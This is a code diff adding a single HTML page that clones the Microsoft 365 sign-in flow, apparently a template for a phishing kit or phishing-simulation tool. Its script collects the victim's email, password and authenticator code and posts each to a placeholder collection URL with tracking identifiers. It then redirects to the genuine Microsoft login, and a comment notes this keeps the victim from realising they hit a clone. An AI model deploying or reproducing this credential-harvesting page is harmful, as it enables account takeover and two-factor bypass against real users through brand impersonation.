@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="signin-shell">
+  <div class="signin-card" data-step="email">
+    <div class="signin-logo">[Microsoft 365]</div>
+    <div class="signin-title">Sign in</div>
+    <form id="step-email" autocomplete="off">
+      <input type="email" name="email" class="signin-field" placeholder="Email, phone, or Skype" required>
+      <div class="signin-meta">
+        <a href="#">Can't access your account?</a>
+      </div>
+      <div class="signin-actions">
+        <button type="button" class="signin-btn secondary" onclick="history.back()">Back</button>
+        <button type="submit" class="signin-btn">Next</button>
+      </div>
+    </form>
+
+    <form id="step-password" autocomplete="off" style="display:none">
+      <div class="signin-account-chip">
+        <span class="dot"></span>
+        <span id="email-echo">user@example.com</span>
+      </div>
+      <div class="signin-title">Enter password</div>
+      <input type="password" name="password" class="signin-field" placeholder="Password" required>
+      <div class="signin-meta">
+        <a href="#">Forgot my password</a>
+      </div>
+      <div class="signin-actions">
+        <button type="submit" class="signin-btn">Sign in</button>
+      </div>
+    </form>
+
+    <form id="step-2fa" autocomplete="off" style="display:none">
+      <div class="signin-account-chip">
+        <span class="dot"></span>
+        <span id="email-echo-2">user@example.com</span>
+      </div>
+      <div class="signin-title">Verify your identity</div>
+      <p class="signin-sub">Enter the code displayed in your authenticator app.</p>
+      <input type="text" name="code_2fa" class="signin-field code-box" inputmode="numeric"
+             pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
+      <div class="signin-actions">
+        <button type="submit" class="signin-btn">Verify</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="signin-footer">
+  <span>Terms of use &middot; Privacy &amp; cookies &middot; &hellip;</span>
+</div>
+
+<script data-tracker src="{{TRACKER_URL}}"></script>
+<script>
+(function () {
+  var POST_URL = "{{POST_URL}}";
+  function trackerCtx() {
+    // The tracker script (if injected) exposes window.__taphish_tracker with
+    // {rid, session_id, tracker_id}. We fall back to URL params when missing.
+    var t = window.__taphish_tracker || {};
+    var q = new URLSearchParams(location.search);
+    return {
+      rid:        t.rid        || q.get("rid")        || "",
+      sess_id:    t.session_id || q.get("sess_id")    || "",
+      trackerId:  t.tracker_id || q.get("trackerId")  || "",
+    };
+  }
+  function post(payload, cb) {
+    if (!POST_URL) { cb(); return; }
+    fetch(POST_URL, {
+      method: "POST",
+      mode: "cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).then(cb, cb);
+  }
+  var formEmail = document.getElementById("step-email");
+  var formPwd   = document.getElementById("step-password");
+  var form2fa   = document.getElementById("step-2fa");
+  var emailVal  = "";
+
+  formEmail.addEventListener("submit", function (e) {
+    e.preventDefault();
+    emailVal = formEmail.elements["email"].value;
+    document.getElementById("email-echo").textContent = emailVal;
+    document.getElementById("email-echo-2").textContent = emailVal;
+    var ctx = trackerCtx();
+    post({
+      page: 1,
+      form_field_data: { email: emailVal },
+      rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
+    }, function () {
+      formEmail.style.display = "none";
+      formPwd.style.display = "block";
+    });
+  });
+  formPwd.addEventListener("submit", function (e) {
+    e.preventDefault();
+    var pwd = formPwd.elements["password"].value;
+    var ctx = trackerCtx();
+    post({
+      page: 2,
+      form_field_data: { email: emailVal, password: pwd },
+      rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
+    }, function () {
+      formPwd.style.display = "none";
+      form2fa.style.display = "block";
+    });
+  });
+  form2fa.addEventListener("submit", function (e) {
+    e.preventDefault();
+    var code = form2fa.elements["code_2fa"].value;
+    var ctx = trackerCtx();
+    post({
+      page: 3,
+      form_field_data: { email: emailVal },
+      code_2fa: code,
+      rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
+    }, function () {
+      // Operator typically redirects to the real product after capture.
+      // Defaulting to the org's official login keeps the user from
+      // realizing they hit a clone.
+      location.href = "https://login.microsoftonline.com/";
+    });
+  });
+})();
+</script>
+</body>
+</html>
